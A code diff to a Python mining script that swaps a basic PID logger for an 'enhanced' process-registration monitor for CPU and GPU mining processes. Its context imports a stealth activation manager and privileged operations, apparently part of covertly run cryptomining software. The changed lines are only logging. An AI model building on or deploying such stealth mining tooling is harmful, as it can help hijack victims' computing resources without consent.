@@ -46,8 +46,8 @@ from mining_environment.scripts.privileged_operations import get_privileged_mana
 
 # **Import** (nhập khẩu) **Stealth Activation Manager** (trình quản lý kích hoạt ẩn danh – centralized stealth system)
 from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
-# PID Logger (ghi PID tiến trình khai thác)
-from pid_logger import start_worker, log_pid
+# Enhanced PID Logger với Real Process Output Monitor
+from pid_logger import start_worker, log_pid, register_process
 
 # **Import** (nhập khẩu) **Mining Performance Logger** (trình ghi nhật ký hiệu suất khai thác – theo dõi và ghi lại các chỉ số)
 
@@ -636,12 +636,19 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                 # **Register process** (đăng ký tiến trình) với **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
                 if process:
                     register_mining_process(process_name, process.pid, process)
-                    # Ghi PID ngay khi khởi tạo thành công
+                    
+                    # Enhanced PID Logger: Đăng ký để monitor runtime output
                     try:
-                        from pid_logger import log_pid
-                        log_pid(process.pid, cpu)
+                        process_type = "cpu" if cpu else "gpu"
+                        register_process(process.pid, process_type, process, process_name)
+                        logger.info(f"✅ Registered PID {process.pid} ({process_type}) for enhanced monitoring")
                     except Exception as _pid_err:
-                        logger.warning(f"PID logger failed: {_pid_err}")
+                        logger.warning(f"Enhanced PID logger registration failed: {_pid_err}")
+                        # Fallback to legacy log_pid
+                        try:
+                            log_pid(process.pid, cpu)
+                        except Exception as _fallback_err:
+                            logger.error(f"Fallback PID logging also failed: {_fallback_err}")
                 
                 # **Detailed operation logging** (ghi log thao tác chi tiết) - ĐỊNH NGHĨA TRƯỚC KHI SỬ DỤNG
                 operation_details = {
@@ -971,8 +978,8 @@ def cpu_mining_thread():
                     thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {cpu_process} (type: {type(cpu_process)})")
                     if cpu_process:
                         thread_logger.info(f"🔍 [DEBUG] CPU process received successfully - PID: {cpu_process.pid}")
-                        # Ghi PID vào pid_cpu.log
-                        log_pid(cpu_process.pid, True)
+                        # Enhanced PID Logger: register_process đã được gọi trong start_mining_process
+                        thread_logger.info(f"✅ CPU process PID {cpu_process.pid} registered for enhanced monitoring")
                     else:
                         thread_logger.error(f"🔍 [DEBUG] CPU process is None - start_mining_process failed")
                     
@@ -1064,8 +1071,8 @@ def gpu_mining_thread():
                 thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {gpu_process} (type: {type(gpu_process)})")
                 if gpu_process:
                     thread_logger.info(f"🔍 [DEBUG] GPU process received successfully - PID: {gpu_process.pid}")
-                    # Ghi PID vào pid_gpu.log
-                    log_pid(gpu_process.pid, False)
+                    # Enhanced PID Logger: register_process đã được gọi trong start_mining_process  
+                    thread_logger.info(f"✅ GPU process PID {gpu_process.pid} registered for enhanced monitoring")
                 else:
                     thread_logger.error(f"🔍 [DEBUG] GPU process is None - start_mining_process failed")
                 
